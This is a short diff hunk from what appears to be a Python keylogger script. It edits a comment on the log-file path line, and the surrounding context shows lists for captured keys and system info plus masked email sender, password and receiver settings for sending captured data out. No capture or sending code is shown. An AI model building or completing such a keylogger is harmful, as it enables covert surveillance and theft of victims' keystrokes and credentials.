@@ -17,7 +17,7 @@ sys_info = []
 fucking_keys = []
 
 
-keyloger_files_location = "/home/kali/Desktop/keylooger"  #------> Change here
+keyloger_files_location = "/home/kali/Desktop/keylooger"  
 EMAIL_SENDER = '###########'  #------> Change here
 EMAIL_PASSWORD = '#########*'  #------> Change here
 EMAIL_RECEIVER = '#########'  #------> Change here
